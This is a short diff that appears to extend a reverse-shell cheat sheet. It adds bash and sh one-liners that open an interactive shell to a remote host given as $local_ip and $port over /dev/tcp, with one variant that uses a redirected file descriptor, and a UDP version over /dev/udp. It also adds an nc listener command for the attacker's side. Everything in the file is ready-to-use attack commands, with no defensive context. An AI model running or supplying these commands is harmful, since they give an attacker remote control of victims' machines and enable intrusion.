@@ -1,1 +1,11 @@
+# TCP
 bash -i >& /dev/tcp/$local_ip/$port 0>&1
+
+0<&196;exec 196<>/dev/tcp/$local_ip/$port; sh <&196 >&196 2>&196
+
+# UDP
+# Victim:
+sh -i >& /dev/udp/$local_ip/$port 0>&1
+
+# Listen with:
+nc -u -lvp $port
